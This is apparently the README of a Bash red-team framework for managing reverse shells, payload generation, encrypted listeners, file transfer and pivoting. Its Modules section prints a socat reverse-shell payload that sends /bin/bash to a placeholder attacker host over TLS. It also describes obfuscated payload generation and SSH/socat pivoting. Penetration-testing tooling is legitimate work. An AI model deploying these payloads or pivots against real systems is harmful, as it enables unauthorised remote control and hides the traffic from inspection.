# RedTeam Shell Framework

A modular, lightweight Bash framework for managing reverse shells, encrypted listeners, payload generation, file transfers, and pivoting — built for authorized penetration testing and security research.

> **Legal Notice:** This tool is intended exclusively for authorized security assessments, red team exercises, and educational use in controlled environments. Unauthorized use against any system is illegal. See [Legal Disclaimer](#legal-disclaimer).

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Project Structure](#project-structure)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Modules](#modules)
- [Documentation](#documentation)
- [Legal Disclaimer](#legal-disclaimer)
- [Author](#author)
- [License](#license)

---

## Overview

RedTeam Shell Framework is a **controller–module CLI** built entirely in Bash. It wraps standard Unix networking tools (`nc`, `socat`, `openssl`, `ssh`) into an interactive menu-driven interface, enabling operators to:

- Catch and manage reverse/bind shell connections
- Generate payloads for multiple languages
- Establish SSL/TLS-encrypted shell channels
- Transfer files securely with integrity checks
- Create port-forwarding relays and SSH tunnels
- Stabilize shells into full interactive PTYs

All activity is logged to `logs/framework.log` for audit purposes.

---

## Features

| Module | Capability |
|--------|------------|
| **Listeners** | Reverse & bind listeners via `nc`/`ncat`, optional `rlwrap` for history |
| **Payloads** | Bash, PowerShell, Python generators — Base64 encoding, obfuscation, save to file |
| **Encryption** | `socat` SSL/TLS listener, RSA-2048 self-signed cert generation, encrypted payload |
| **Transfer** | SCP upload/download, MD5 + SHA256 integrity verification, transfer history |
| **Relay / Pivot** | `socat` port relay, SSH local / remote / dynamic (SOCKS) tunnels |
| **PTY Upgrade** | Step-by-step guides for Python `pty.spawn`, `script`, environment fix |
| **Logging** | Session IDs, event tracking, append-only log file in `logs/` |

---

## Project Structure

```
redteam-shell-framework/
├── shellmaster.sh          # Main CLI — interactive menu & module loader
├── config.sh               # Global paths and environment configuration
├── utils.sh                # Colors, validation, logging helpers, session utils
│
├── modules/
│   ├── listeners.sh        # Reverse & bind shell listeners
│   ├── shells.sh           # Payload generator (Bash / PowerShell / Python)
│   ├── encrypt.sh          # SSL/TLS encrypted listener via socat
│   ├── transfer.sh         # SCP file upload/download & checksum
│   ├── relay.sh            # socat relay & SSH tunnel management
│   ├── upgrade.sh          # PTY upgrade guides & environment stabilization
│   └── logger.sh           # Audit logging and session management
│
├── docs/
│   ├── ARCHITECTURE.md     # System design and module internals
│   ├── API.md              # Function reference for all modules
│   ├── EXAMPLES.md         # Real-world usage scenarios
│   ├── SECURITY.md         # Security model and threat considerations
│   ├── TROUBLESHOOTING.md  # Common issues and fixes
│   └── DOCUMENTATION_INDEX.md
│
├── logs/                   # Runtime logs and session records
├── tmp/                    # Temporary files (certs, keys)
├── LICENSE
└── .gitignore
```

---

## Requirements

### Required

| Tool | Purpose |
|------|---------|
| `bash` 4.0+ | Core runtime |
| `nc` / `ncat` | Listeners and connections |
| `socat` | Encrypted listeners and port relays |
| `openssl` | Certificate generation |
| `ssh` / `scp` | SSH tunneling and file transfer |

### Optional

| Tool | Purpose |
|------|---------|
| `rlwrap` | Command history and line editing in listeners |
| `python3` | PTY upgrade (`pty.spawn`) |

### Install dependencies (Debian / Ubuntu)

```bash
sudo apt update && sudo apt install -y netcat-traditional socat openssl rlwrap openssh-client python3
```

---

## Installation

```bash
# Clone the repository
git clone https://github.com/taguianas/redteam-shell-framework.git
cd redteam-shell-framework

# Make scripts executable
chmod +x shellmaster.sh config.sh utils.sh modules/*.sh

# Launch
./shellmaster.sh
```

---

## Usage

Run the main controller from the project root:

```bash
./shellmaster.sh
```

The interactive menu will load:

```
  ____  _          _ _ __  __           _
 / ___|| |__   ___| | |  \/  | __ _ ___| |_ ___ _ __
 \___ \| '_ \ / _ \ | | |\/| |/ _` / __| __/ _ \ '__|
  ___) | | | |  __/ | | |  | | (_| \__ \ ||  __/ |
 |____/|_| |_|\___|_|_|_|  |_|\__,_|___/\__\___|_|

  :: RedTeam Shell Framework :: v1.0 ::
-----------------------------------------------------

[ Phase 1: Core Listeners ]
1. Start Listener (nc/rlwrap)

[ Phase 2: Payloads ]
2. Generate Reverse Shell Payload

[ Phase 3: Encryption ]
3. Start Encrypted Listener (socat/ncat)

[ Phase 4-6: Advanced Operations ]
4. File Transfer
5. Pivot / Relay
6. Shell Stabilization (PTY)

99. Exit
```

---

## Modules

### 1. Listeners

Start a reverse or bind listener on any port. Optionally wrap with `rlwrap` for command history and line editing. Each session is assigned a unique ID and logged.

```
1. Start Reverse Listener   – catches incoming shells
2. Start Bind Listener      – listens for attacker to connect
3. List Active Listeners
4. Stop Listener
```

### 2. Payload Generator

Generate ready-to-use reverse shell one-liners with your IP and port injected. Supports optional Base64 encoding and variable obfuscation.

```
1. Bash Reverse Shell
2. PowerShell Reverse Shell
3. Python Reverse Shell
4. One-Liner Templates
5. View Generated Payloads
6. Batch Generate (All Types)
```

Payloads are saved to `payloads/` with metadata (filename, size, MD5, timestamp).

### 3. Encrypted Listener

Wrap shell traffic in SSL/TLS using `socat` and a self-signed RSA-2048 certificate. Prevents cleartext inspection of the connection.

```
1. Generate New Certificate
2. Start Encrypted Listener (socat SSL)
3. Generate Encrypted Payload (for target)
```

**Target payload example:**
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

### 4. File Transfer

Upload and download files over SCP. Verify integrity with MD5 and SHA256 checksums after transfer.

```
1. Upload File   (local → remote via SCP)
2. Download File (remote → local via SCP)
3. Verify Checksum (MD5 + SHA256)
4. View Transfer History
```

### 5. Relay / Pivot

Create port-forwarding relays with `socat` or SSH tunnels to pivot through intermediate hosts.

```
1. Create socat Relay       – forward traffic: listen_port → host:port
2. Create SSH Tunnel        – local (-L), remote (-R), or SOCKS (-D)
3. List Active Relays
4. Stop Relay
```

**socat relay example:**
```bash
# Traffic from port 4444 forwarded to internal host
socat TCP-LISTEN:4444,fork,reuseaddr TCP:192.168.1.50:4444
```

### 6. Shell Stabilization (PTY Upgrade)

Step-by-step guides to upgrade a limited reverse shell to a fully interactive PTY.

```
1. Python PTY Upgrade    – pty.spawn('/bin/bash') + stty raw -echo
2. Script PTY Upgrade    – script -qc /bin/bash /dev/null
3. Fix Environment       – TERM, PATH, stty rows/cols, reset
4. Enable Terminal Features – history, colour prompt, aliases
```

---

## Documentation

Full documentation is in the `docs/` directory:

| File | Contents |
|------|----------|
| [`ARCHITECTURE.md`](docs/ARCHITECTURE.md) | System design, data flow, module internals |
| [`API.md`](docs/API.md) | Function reference for all modules |
| [`EXAMPLES.md`](docs/EXAMPLES.md) | Real-world usage walkthroughs |
| [`SECURITY.md`](docs/SECURITY.md) | Threat model and security considerations |
| [`TROUBLESHOOTING.md`](docs/TROUBLESHOOTING.md) | Common issues and solutions |

---

## Legal Disclaimer

This framework is provided for **educational purposes** and **authorized security testing only**.

Permitted uses:
- Authorized penetration testing engagements with written permission
- Red team exercises in controlled lab environments
- Security research and tool development
- Academic study of offensive security techniques

**Using this tool against any system without explicit prior authorization is illegal** and may violate local, national, or international law. The author assumes no responsibility or liability for any misuse or damage caused by this software. By using this project, you accept full responsibility for your actions and compliance with all applicable laws.

---

## Author

**Anas TAGUI**

Developed as part of ongoing research into shell handling, traffic encryption, and modular Bash-based security tooling.

---

## License

This project is licensed under the **MIT License**. See the [`LICENSE`](LICENSE) file for full details.
